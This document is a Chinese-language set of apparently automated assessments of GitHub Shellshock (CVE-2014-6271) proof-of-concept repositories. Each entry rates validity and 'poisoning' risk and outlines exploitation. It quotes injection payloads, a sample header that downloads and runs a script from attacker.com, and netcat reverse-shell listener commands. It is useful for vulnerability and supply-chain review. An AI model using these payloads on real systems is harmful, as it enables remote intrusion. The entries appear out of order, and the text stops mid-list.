评估 PoC 代码的投毒风险表明，主要风险较低，约为 5%。

*   **高风险文件:** 位于`/tmp/47c4ac3d27239b789878e6360b54dc21/web-insecure/Dockerfile`，这个Dockerfile 用于构建包含漏洞环境，该漏洞是已知的，构建目的是用于演示验证，所以它不是投毒代码。
*   **低风险文件:** 其他文件（例如 web-secure 目录中的文件和 k8s 清单文件）似乎是良性的，并且用于设置安全的环境以进行比较或者演示。
*   **总体分析:**

虽然该存储库的目的是演示漏洞，但攻击者可能会修改 `web-insecure/Dockerfile` 以包含其他恶意软件或后门。用户在使用这些文件构建镜像时应谨慎。

**利用方式：**

利用 CVE-2014-6271 漏洞涉及以下步骤：

1.  **确定目标：**识别运行易受攻击的 Bash 版本的系统，该系统通常用于处理 Web 请求或 CGI 脚本。
2.  **构造攻击负载：**创建一个包含恶意 Bash 函数定义的特殊构造的环境变量。
3.  **传递攻击负载：**通过 HTTP 请求头（例如 `User-Agent`）或 CGI 脚本可以访问的任何其他环境变量将攻击负载传递到目标系统。
4.  **执行任意代码：**当 Bash 处理恶意环境变量时，它会执行其中嵌入的命令。

在提供的 PoC 代码中，利用方式如下：

1.  攻击者设置一个 netcat 监听器 (`nc -nvlp 5050`)。
2.  攻击者使用 curl 命令向易受攻击的 Web 服务发送一个 HTTP 请求，其中 `User-Agent` 头包含一个恶意的 Bash 函数定义。这个函数定义包含执行反向 shell 的命令，将 shell 连接到攻击者的 netcat 监听器。
3.  当 Web 服务（通常通过 CGI 脚本）执行 Bash 时，Bash 会处理恶意的 `User-Agent` 头，执行反向 shell 命令，并允许攻击者访问受害容器上的 shell。

**项目地址:** [mochizuki875/CVE-2014-6271-Apache-Debian](https://github.com/mochizuki875/CVE-2014-6271-Apache-Debian)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #25

**来源**: [CVE-2014-6271-moften_CVE-2014-6271.md](../2014/CVE-2014-6271-moften_CVE-2014-6271.md)

## CVE-2014-6271 Shellshock漏洞扫描器

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许攻击者执行任意命令

**影响版本:** <= 4.3

**利用条件:** 目标系统运行存在漏洞的Bash版本，并且存在CGI脚本或其他方式通过环境变量调用Bash。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271 (Shellshock) 漏洞允许攻击者通过特制的 Bash 环境变量执行任意命令。漏洞存在于 Bash 处理函数定义后尾随字符串的方式中。 

**有效性：**
提供的PoC代码是一个Python脚本，用于扫描目标URL是否存在Shellshock漏洞。它通过发送包含恶意payload的User-Agent头部的HTTP请求到常见的CGI脚本路径，然后检查响应中是否包含特定的字符串（'VULNERABLE-SHELLSHOCK'）来判断目标是否易受攻击。根据漏洞库信息和搜索结果，该漏洞利用方式是有效的。

**投毒风险：**
该仓库包含一个Python脚本和一个README.md文件。Python脚本的功能是发送包含特定payload的HTTP请求并检查响应。README.md文件仅包含项目名称和描述。
 *  投毒代码分析: 该python脚本主要功能是发送特定Header的请求到服务器端CGI脚本,存在以下潜在的投毒风险：
    *  **CGI脚本路径猜测：**脚本中包含一个常见的CGI脚本路径列表。如果攻击者控制了该列表，可以通过添加恶意CGI路径来欺骗扫描者，引导他们攻击不存在的或伪造的服务。
    *  **Payload修改：**虽然当前的payload是良性的，用于检测漏洞，但攻击者可能修改payload以执行恶意操作，例如上传后门或执行拒绝服务攻击。
    *  **扫描行为：** 扫描行为本身可能被目标系统检测为恶意活动，从而触发防御机制或记录扫描者的IP地址。
    *  **误报风险：**脚本依赖于特定的字符串（'VULNERABLE-SHELLSHOCK'）来判断漏洞是否存在。如果目标服务器返回包含该字符串的响应，即使实际不存在漏洞，脚本也会报告为易受攻击。修改这个字串可以导致信息泄露或者权限提升,因此可能存在一定风险。

**利用方式：**
1.  **环境变量注入：** 攻击者构造一个包含恶意代码的 Bash 函数定义的环境变量。例如：`(){ :;}; /usr/bin/id`。
2.  **触发 Bash 执行：** 通过 CGI 脚本、OpenSSH 的 ForceCommand 功能、DHCP 客户端脚本等方式，将构造的包含恶意代码的环境变量传递给 Bash。
3.  **代码执行：** 当 Bash 执行上述环境变量时，由于漏洞，尾随在函数定义后的命令会被执行，从而实现远程代码执行。

**总结：**
该PoC代码利用了Shellshock漏洞，通过环境变量注入执行任意命令。漏洞影响范围广泛，修复难度较大，危害程度高。


**项目地址:** [moften/CVE-2014-6271](https://github.com/moften/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #26

**来源**: [CVE-2014-6271-mritunjay-k_CVE-2014-6271.md](../2014/CVE-2014-6271-mritunjay-k_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过环境变量影响Bash执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，又名ShellShock，是GNU Bash中的一个严重漏洞。攻击者可以通过构造包含恶意代码的环境变量，当这些环境变量被传递给Bash执行的进程时，会导致远程代码执行。 

**有效性：** 提供的POC代码是有效的。它通过设置`User-Agent`头来传递恶意payload。如果目标URL指向一个CGI脚本，且该脚本使用Bash处理环境变量，那么攻击者就可以执行任意命令。POC代码还包含一个检查机制，如果URL不包含`/cgi-bin/status`，它会提示用户是否要添加该路径，这增加了攻击的灵活性。

**投毒风险：** 在提供的`exploit.py`和`README.md`文件中，没有发现任何明显的投毒代码。代码逻辑清晰，目标是利用ShellShock漏洞执行命令。没有发现作者尝试引入恶意行为，例如上传恶意文件、植入后门或窃取凭据。因此，投毒风险评估为0%。

**利用方式：** 

1.  **确定目标：** 找到运行存在漏洞的Bash版本的系统，该系统需要具有某种暴露点，该暴露点允许通过环境变量注入的方式利用Bash。常见的暴露点包括CGI脚本、OpenSSH的`ForceCommand`特性以及某些DHCP客户端。
2.  **构造Payload：** 构造一个包含恶意代码的环境变量。Payload的形式通常为`() { :; }; <command>`。其中`<command>`是要执行的shell命令。
3.  **传递Payload：** 将构造的Payload作为环境变量传递给Bash。对于CGI脚本，这可以通过设置HTTP头的`User-Agent`字段来实现，如提供的POC代码所示。在其他场景中，可能需要使用其他方法来设置环境变量。
4.  **执行命令：** 当Bash执行接收到包含Payload的CGI脚本时，它会解析环境变量，触发漏洞，并执行注入的命令。
5.  **验证执行结果:** POC脚本会打印出`page`的内容,命令执行的结果将会嵌入到返回的内容中.

**综上所述：** 提供的POC代码利用了ShellShock漏洞，通过构造恶意环境变量并在目标系统上触发执行，实现了远程命令执行。虽然漏洞利用风险很高，但提供的代码本身没有发现投毒风险。

**项目地址:** [mritunjay-k/CVE-2014-6271](https://github.com/mritunjay-k/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #27

**来源**: [CVE-2014-6271-opsxcq_exploit-CVE-2014-6271.md](../2014/CVE-2014-6271-opsxcq_exploit-CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，并且攻击者能够控制环境变量。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的严重漏洞。该漏洞源于Bash处理环境变量中函数定义之后存在的字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，当这些环境变量被Bash解析时，就能执行任意命令。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2014-6271是一个经过验证的漏洞，具有较高的利用成功率。

提供的Dockerfile和相关文件构成了一个可以利用该漏洞的环境。Dockerfile设置了一个基于Debian Wheezy的Apache服务器，并部署了一个CGI脚本（vulnerable），该脚本会调用Bash。攻击者可以通过设置恶意的环境变量，然后向CGI脚本发送HTTP请求来触发漏洞，从而在服务器上执行任意命令。

**投毒风险：**

分析提供的文件，存在一定的投毒风险，约为10%。Dockerfile中从/packages安装了预先存在的软件包。虽然COPY指令本身没有明显的恶意代码，但有需要审核的地方：
1. Dockerfile 从 `/packages` 目录安装软件包，而软件包的具体内容没有给出。如果这些包由攻击者控制，可能包含恶意后门。
2. `vulnerable` CGI 脚本的内容需要仔细审查，如果脚本本身存在后门，则存在投毒风险
3. main.sh 的内容也需要确认, 是否有安装一些额外的包.

**利用方式：**

1.  **CGI脚本利用：**  最常见的利用方式是通过CGI脚本。攻击者向Web服务器发送包含恶意环境变量的HTTP请求。如果Web服务器配置为使用Bash执行CGI脚本，Bash将解析这些环境变量，导致恶意代码执行。
2.  **OpenSSH ForceCommand：**  如果OpenSSH配置了ForceCommand选项，攻击者可以通过修改环境变量来执行任意命令。
3.  **DHCP客户端：**  某些DHCP客户端在执行脚本时会设置环境变量，攻击者可以通过控制DHCP服务器来注入恶意环境变量。

总之，CVE-2014-6271是一个高危漏洞，利用简单，影响广泛。需要及时修补受影响的系统。


**项目地址:** [opsxcq/exploit-CVE-2014-6271](https://github.com/opsxcq/exploit-CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #28

**来源**: [CVE-2014-6271-rsherstnev_CVE-2014-6271.md](../2014/CVE-2014-6271-rsherstnev_CVE-2014-6271.md)

## CVE-2014-6271 - ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程命令执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统运行Bash且存在可利用的入口点，例如CGI脚本、OpenSSH ForceCommand等。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2014-6271，也被称为ShellShock，是一个存在于GNU Bash中的远程命令执行漏洞。该漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。漏洞利用的核心在于Bash在处理函数定义后附加的字符串时存在缺陷。 

**有效性评估：**
提供的Python POC代码利用了ShellShock漏洞，其有效性较高。代码首先通过发送包含特定字符串（`HelloKittyFromN0rdeN!`）的请求头来检测目标系统是否存在漏洞。如果检测到漏洞，则进入交互式shell，允许攻击者执行任意命令。

**利用方式分析：**
1.  **漏洞检测：** POC首先发送一个HTTP请求，其中User-Agent、Referer和Cookie头都包含恶意的Bash代码。这段代码的目的是在受影响的Bash版本中执行`echo HelloKittyFromN0rdeN!`命令，从而验证漏洞是否存在。
2.  **命令执行：** 如果漏洞存在，POC会进入一个循环，允许攻击者输入命令。输入的命令会被Base64编码，然后插入到HTTP请求头中。服务器端的Bash会解码并执行这些命令。
3.  **向量：** 此POC利用HTTP请求头（User-Agent, Referer, Cookie）作为攻击向量，这些头通常会被传递给服务器并可能被Bash处理。

**投毒风险分析：**
POC代码主要功能是检测和利用ShellShock漏洞。分析代码后，发现潜在的投毒风险较低（约1%）。

*   **Base64编码：** 使用Base64编码命令可能会被认为是一种混淆手段，但这是为了确保命令在HTTP头中传输的安全性，并非恶意隐藏代码。
*   **第三方库：** POC使用了requests库，理论上存在requests库被篡改的风险。但是，requests是常用的Python库，被篡改的可能性极低。
*   **BASE64_PATH变量:** 该变量用于指定`base64`命令的路径,如果该路径被修改为恶意程序,会存在投毒风险,但原代码中该变量默认为`/usr/bin/base64`,属于正常路径. 
*   **风险点：** 主要风险集中在使用未经授权的服务器上执行任意命令，这本身就是漏洞利用的目的，而不是POC代码引入的额外风险。

**搜索引擎结果印证：**
搜索结果确认了CVE-2014-6271是ShellShock漏洞，并且是广泛存在的，有多种利用方式。这些结果也强调了该漏洞的严重性和潜在影响。

综上所述，该POC代码的有效性较高，投毒风险较低，主要用于检测和利用ShellShock漏洞，允许攻击者通过HTTP请求头在目标系统上执行任意命令。

**项目地址:** [rsherstnev/CVE-2014-6271](https://github.com/rsherstnev/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---



---

## POC #12

**来源**: [CVE-2014-6271-TheRealCiscoo_Shellshock-Exploit.md](../2014/CVE-2014-6271-TheRealCiscoo_Shellshock-Exploit.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.14 - 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过HTTP Header设置环境变量，且Bash版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271，也被称为ShellShock，是一个存在于GNU Bash中的高危漏洞。该漏洞源于Bash处理环境变量中函数定义后附加字符串的方式存在缺陷，攻击者可以通过构造包含恶意代码的环境变量，当Bash执行相关程序时，恶意代码会被执行，从而实现远程命令执行。从漏洞库信息和搜索引擎结果来看，此漏洞影响广泛，修复不彻底，危害巨大。

**有效性：**
提供的Python POC代码利用了ShellShock漏洞。它构造了一个包含恶意Bash代码的User-Agent头，并向目标URI发送GET请求。如果目标URI是一个CGI脚本，或者其他任何调用Bash并使用该User-Agent头作为环境变量的应用程序，那么恶意的Bash代码就会被执行，从而建立反向shell。

**投毒风险：**
该仓库的投毒风险较低。虽然任何代码都可能包含恶意成分，但此POC代码相对简单，主要功能是利用已知的ShellShock漏洞。潜在的风险可能包括：

*   作者可能在反向shell的Payload中植入其他恶意命令。但通过代码审计，反向shell的Payload清晰可见，未发现隐藏的恶意代码。
*   该代码可能针对特定系统环境做了优化，如果攻击者不了解这些优化，可能会导致利用失败，或留下攻击痕迹。但这种“优化”也可以被视作一种隐蔽的攻击尝试。

综合评估，该代码存在恶意投毒的可能性较低，约为5%。这个百分比代表一种潜在的风险，需要仔细审查代码才能完全消除。

**利用方式：**
1.  **确定目标：** 找到运行受影响Bash版本的服务器，并确认存在可以通过HTTP头设置环境变量的CGI脚本或其他应用。
2.  **准备攻击环境：** 在攻击者机器上设置NetCat监听指定端口，等待反向shell连接：`ncat -lkvnp <attacker-port>`。
3.  **构造Payload：** 使用POC脚本，指定目标IP地址、URI、攻击者IP地址和监听端口。
4.  **发送请求：** 运行POC脚本，它会构造一个包含恶意代码的HTTP GET请求，并将User-Agent设置为包含恶意代码的环境变量。
5.  **利用漏洞：** 如果目标存在漏洞，Bash会执行User-Agent头中的恶意代码，建立与攻击者机器的反向shell连接。
6.  **控制目标：** 攻击者通过反向shell控制目标系统，执行任意命令。

**项目地址:** [TheRealCiscoo/Shellshock-Exploit](https://github.com/TheRealCiscoo/Shellshock-Exploit)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #13

**来源**: [CVE-2014-6271-YunchoHang_CVE-2014-6271-SHELLSHOCK.md](../2014/CVE-2014-6271-YunchoHang_CVE-2014-6271-SHELLSHOCK.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** 通过 4.3

**利用条件:** 目标系统使用Bash，且存在允许通过环境变量影响Bash执行的接口(例如CGI脚本)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）是一个存在于GNU Bash中的命令注入漏洞。该漏洞允许远程攻击者通过构造包含恶意代码的环境变量，在目标系统上执行任意命令。利用方式通常涉及以下步骤：

1.  **确定目标系统是否易受攻击：** 检查目标系统是否正在运行易受攻击的Bash版本(通过 4.3).
2.  **寻找攻击入口点：** 寻找目标系统上允许通过环境变量影响Bash执行的接口，例如CGI脚本、OpenSSH的ForceCommand功能、DHCP客户端等。
3.  **构造恶意环境变量：** 构造包含恶意代码的函数定义的环境变量。例如：`() {{ :;}}; command`，其中`command`是要执行的命令。
4.  **发送包含恶意环境变量的请求：** 将构造的恶意环境变量通过HTTP请求头、SSH连接或其他方式传递给目标系统。
5.  **触发漏洞：** 目标系统在执行Bash时，会解析包含恶意代码的环境变量，从而执行攻击者指定的命令。

提供的POC代码`AutoShocker.py`是一个利用Shellshock漏洞的自动化脚本，具备以下功能：

*   **命令执行：** 允许攻击者在目标系统上执行任意命令，并将结果返回。
*   **反向Shell：** 允许攻击者在目标系统上建立反向Shell连接，从而获得对目标系统的完全控制权。

该漏洞利用的有效性取决于目标系统是否易受攻击，以及攻击者是否能够找到合适的攻击入口点。由于脚本需要用户输入目标IP和执行的命令/反向shell信息，因此投毒风险主要在于：

*   **误用风险：** 用户可能在未经授权的系统上使用该脚本，导致法律问题。
*   **脚本篡改：**  攻击者可能篡改脚本，添加恶意功能（例如植入后门、窃取用户凭据等），然后诱骗其他用户使用。

因此，我评估此仓库中存在作者隐藏的投毒代码的风险为10%。这主要是基于脚本本身的性质（漏洞利用工具）以及潜在的被篡改和滥用的可能性。

**项目地址:** [YunchoHang/CVE-2014-6271-SHELLSHOCK](https://github.com/YunchoHang/CVE-2014-6271-SHELLSHOCK)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #14

**来源**: [CVE-2014-6271-ajansha_shellshock.md](../2014/CVE-2014-6271-ajansha_shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 通过 4.3

**利用条件:** 需要目标系统存在Bash环境并且存在可以设置环境变量的利用入口，例如：OpenSSH的ForceCommand、Apache HTTP Server的mod_cgi/mod_cgid等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的命令注入漏洞。攻击者可以通过在环境变量中嵌入恶意代码，当Bash解析这些变量时，恶意代码会被执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2014-6271是一个真实存在且影响广泛的漏洞。提供的shelly.sh脚本是一个漏洞扫描器，用于检测目标系统是否存在Shellshock漏洞。由于它旨在 *检测* 而非 *利用* 漏洞，因此可以判断poc有效。

**投毒风险：**
分析提供的shelly.sh脚本，主要功能是检测目标系统是否存在Shellshock漏洞。脚本本身包含恶意代码的可能性较低，其主要通过发送包含特定payload的环境变量来触发漏洞，因此投毒的风险主要来自于脚本作者是否在检测Payload之外添加了额外的恶意逻辑。

尽管代码看起来比较直接，但仍然存在一定的低概率投毒风险，例如：
*   在漏洞检测逻辑之外，添加额外的命令执行代码，例如，扫描到存在漏洞后执行特定操作，上传信息等。
*   通过精心构造的payload，在检测漏洞的同时，悄悄地在目标系统上留下后门。

综合考虑代码量和功能，评估投毒风险为10%。

**利用方式：**
1.  **确定目标：** 找到运行存在漏洞的Bash版本的系统。
2.  **寻找入口点：** 确定可以通过设置环境变量来与目标系统交互的入口点。常见的入口点包括：
    *   **HTTP CGI脚本：** 通过修改HTTP请求头中的User-Agent等字段，设置环境变量。
    *   **OpenSSH ForceCommand：**  通过SSH连接时设置环境变量。
    *   **DHCP客户端：** 某些DHCP客户端脚本在执行时会受到环境变量的影响。
3.  **构造Payload：** 构造包含恶意代码的环境变量。Payload的基本形式为`(){ :; }; command`，其中`command`是要执行的命令。
4.  **发送Payload：** 通过选择的入口点将构造的Payload发送给目标系统。
5.  **执行恶意代码：**  当目标系统中的Bash解析包含恶意代码的环境变量时，恶意代码将被执行，攻击者从而控制目标系统。

**项目地址:** [ajansha/shellshock](https://github.com/ajansha/shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #15

**来源**: [CVE-2014-6271-akr3ch_CVE-2014-6271.md](../2014/CVE-2014-6271-akr3ch_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者通过构造的恶意环境变量执行任意代码。

**影响版本:** <= 4.3

**利用条件:** 目标系统使用存在漏洞的 Bash 版本，且存在允许设置环境变量的途径，如 SSH ForceCommand, Apache mod_cgi/mod_cgid, DHCP 客户端等。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271 (Shellshock) 漏洞存在于 GNU Bash 中，攻击者可以通过在环境变量中嵌入恶意代码，利用 Bash 处理函数定义时存在的缺陷来执行任意命令。提供的 exploit.py 代码通过构造包含恶意命令的 User-Agent 头部，向目标 URL 发送 HTTP 请求，尝试利用 mod_cgi 或其他 CGI 脚本来触发漏洞。该漏洞影响广泛，可能导致服务器被完全控制。

**有效性：**
提供的 Python 脚本是有效的漏洞利用PoC，它通过构造恶意的 User-Agent 头部来触发 Shellshock 漏洞。

**投毒风险：**
该脚本的主要功能是利用 Shellshock 漏洞，没有发现任何明显的投毒代码，0%的可能性存在作者隐藏的投毒代码。

**利用方式：**
1.  确定目标系统运行着存在漏洞的 Bash 版本。
2.  找到一个可以设置环境变量的入口点（如 CGI 脚本）。
3.  使用提供的 Python 脚本或其他类似工具构造包含恶意代码的 HTTP 请求，并将该请求发送到目标 URL。
4.  如果漏洞存在且利用成功，恶意代码将在目标系统上执行。

**项目地址:** [akr3ch/CVE-2014-6271](https://github.com/akr3ch/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #16

**来源**: [CVE-2014-6271-anujbhan_shellshock-victim-host.md](../2014/CVE-2014-6271-anujbhan_shellshock-victim-host.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，并且通过CGI或其他方式允许环境变量注入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于 GNU Bash 中的严重漏洞。该漏洞允许攻击者通过特制的包含函数定义的字符串，在环境变量中注入并执行任意代码。

**有效性：**
提供的 Dockerfile 和相关 CGI 脚本构成了一个有效的 PoC 环境。Dockerfile 设置了一个基于 `vulhub/bash:4.3.0-with-httpd` 镜像的容器，该镜像包含一个易受攻击的 Bash 版本和一个 HTTP 服务器。`victim.cgi` 脚本旨在通过 CGI 执行 Bash 代码，但脚本本身的代码是无害的。漏洞利用的关键在于攻击者如何构造 HTTP 请求，将恶意代码注入到传递给 `victim.cgi` 脚本的环境变量中。如果服务器配置允许，则可以远程利用此漏洞执行任意命令。

**投毒风险：**
在提供的代码片段中，直接的代码投毒风险较低（约为 10%），主要原因是:
* `safe.cgi` 和 `victim.cgi` 文件中的 bash 代码非常简单，只输出“Hello world”，功能正常。没有发现任何恶意代码。  
*  Dockerfile指令中的 `RUN chmod +x /var/www/html/safe.cgi` 和 `RUN chmod +x /var/www/html/victim.cgi` 功能正常，没有发现任何恶意代码。

但是，需要注意以下几点潜在风险：
* **基础镜像风险：** PoC 依赖于 `vulhub/bash:4.3.0-with-httpd` 镜像。虽然该镜像旨在提供一个易受攻击的环境，但仍然需要确保该镜像本身没有被篡改或包含恶意代码。评估基础镜像的来源和可信度至关重要。
* **服务器配置风险：** 漏洞的利用依赖于 Web 服务器（如 Apache）如何处理 CGI 请求以及环境变量。如果服务器配置不当，可能会进一步加剧漏洞的风险。例如，某些配置可能允许攻击者覆盖更多的环境变量，从而扩大攻击面。
* **供应链攻击风险：** 攻击者可能通过污染开发者的环境或者代码仓库来插入恶意代码。

总体来说，直接代码投毒的风险较低，但基础镜像和服务器配置的安全性仍然需要谨慎评估。

**利用方式：**
1.  **目标环境：** 目标系统需要运行一个存在漏洞的 Bash 版本（<= 4.3）。
2.  **攻击入口：** 攻击通常通过 CGI 脚本或其他接受环境变量的 Web 应用入口进行。
3.  **注入恶意代码：** 攻击者构造一个包含恶意代码的环境变量。典型的 Shellshock payload 如下：`() { :; }; echo vulnerable`。这个 payload 利用了 Bash 在处理函数定义后剩余字符串的方式，`echo vulnerable` 会被执行。
4.  **触发漏洞：** 当 Bash 执行 CGI 脚本或处理包含恶意环境变量的请求时，漏洞被触发，攻击者注入的代码被执行。
5.  **远程代码执行：** 一旦漏洞被触发，攻击者就可以在目标系统上执行任意命令，例如获取敏感信息、修改系统配置或安装恶意软件。

**举例说明：**
攻击者可以构造一个 HTTP 请求头，例如 `User-Agent: () { :; }; /usr/bin/wget http://attacker.com/evil.sh -O /tmp/evil.sh; sh /tmp/evil.sh`。当 Web 服务器调用 Bash 处理该请求时，`wget` 命令会被执行，从 `attacker.com` 下载恶意脚本并在目标系统上执行。

**项目地址:** [anujbhan/shellshock-victim-host](https://github.com/anujbhan/shellshock-victim-host)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #17

**来源**: [CVE-2014-6271-b4keSn4ke_CVE-2014-6271.md](../2014/CVE-2014-6271-b4keSn4ke_CVE-2014-6271.md)

## CVE-2014-6271 - Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，且允许通过环境变量影响Bash执行，例如CGI脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。当Bash执行程序（例如，通过CGI脚本在Web服务器上）时，它会解析这些环境变量，从而导致代码注入。 

**有效性：**

根据提供的漏洞库信息、搜索结果和漏洞利用代码，该漏洞利用是有效的。漏洞库中明确指出该漏洞允许远程攻击者执行任意代码，搜索结果中也包含大量关于该漏洞的描述、利用案例和补丁信息。提供的Python POC代码也表明该漏洞可以被利用于获取目标系统的反向shell。

**投毒风险：**

分析提供的Python POC代码，风险较低。代码主要功能是构建带有恶意环境变量的HTTP请求，并发送到目标CGI脚本。代码中存在可以植入恶意代码的风险点在于payload的构建部分，但是目前的代码相对简单，仅用于执行反向shell。该仓库的 README 中有明确的测试目标和使用说明，相对比较安全。综上，认为此仓库存在10%的作者隐藏的投毒代码的可能性，该投毒代码可能为隐蔽的下载和执行其他恶意脚本。

**利用方式：**

1.  **确定目标：** 找到运行Bash且容易受到环境变量影响的应用程序或服务。常见的例子包括Web服务器上的CGI脚本。
2.  **构建Payload：** 构造一个包含恶意代码的环境变量。Payload通常包含一个函数定义，后跟要执行的命令。例如：`(){ :; }; echo vulnerable`
3.  **发送Payload：** 将构造的环境变量作为HTTP请求头或其他方式发送到目标应用程序。对于CGI脚本，可以通过User-Agent或其他HTTP头来传递。
4.  **执行代码：** 当目标应用程序调用Bash执行某些操作时，Bash会解析环境变量，从而执行注入的恶意代码。
5.  **反向Shell:** 本次提供的POC中,攻击者设置监听端口,通过漏洞利用,目标主机反弹shell给攻击者,达到控制目标主机的目的.

**风险缓解：**

*   升级Bash到已修复的版本。
*   限制对CGI脚本和其他易受攻击应用程序的访问。
*   验证和清理所有输入，特别是来自环境变量的输入。
*   使用入侵检测系统（IDS）和入侵防御系统（IPS）来检测和阻止Shellshock攻击。

**项目地址:** [b4keSn4ke/CVE-2014-6271](https://github.com/b4keSn4ke/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #18

**来源**: [CVE-2014-6271-cved-sources_cve-2014-6271.md](../2014/CVE-2014-6271-cved-sources_cve-2014-6271.md)

## CVE-2014-6271-ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或使用OpenSSH的ForceCommand功能等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又称ShellShock，是一个存在于GNU Bash中的远程代码执行漏洞。漏洞源于Bash在处理环境变量中函数定义后的trailing strings的方式存在缺陷，允许攻击者通过构造恶意的环境变量来执行任意代码。

**1. 有效性：**

提供的Dockerfile构建了一个存在ShellShock漏洞的环境。`test.cgi`脚本被放置在`/usr/local/apache2/cgi-bin/`目录下，并且赋予了执行权限。该脚本会输出`/usr/bin/env`的内容，攻击者可以通过构造包含恶意代码的环境变量，并发送HTTP请求访问该CGI脚本，从而触发漏洞并执行恶意代码。因此提供的POC代码是有效的。

**2. 投毒风险：**

分析Dockerfile和相关文件：

*   Dockerfile：用于构建Docker镜像，升级Bash到4.3，并应用patch。
*   README.md：包含关于漏洞的信息以及镜像的来源。
*   `build/test.cgi`：一个简单的CGI脚本，用于触发漏洞。这个脚本本身不包含任何恶意代码,只是用于展示环境变量。

虽然大部分代码用于搭建漏洞测试环境，但仍存在潜在的投毒风险。Dockerfile中使用了`wget`从外部源下载bash源码和patch。尽管URL看起来是官方的GNU源，但如果这些源被劫持，则可能被替换为包含恶意代码的版本。此外，即使源代码没有被篡改，应用patch的过程也可能引入意料之外的问题。

综合来看，投毒风险较低，大约为10%。主要风险在于对外部源的依赖，以及patch应用过程中的潜在问题。

**3. 利用方式：**

ShellShock漏洞的利用方式如下：

1.  **攻击者构造包含恶意代码的环境变量。** 恶意代码被嵌入到函数定义之后，例如：`(){ :; }; command`。
2.  **攻击者通过某种方式将该环境变量传递给Bash。** 常见的场景包括：
    *   **CGI脚本：** 攻击者可以通过HTTP请求头设置环境变量，当Web服务器调用CGI脚本时，会将这些环境变量传递给Bash解释器。
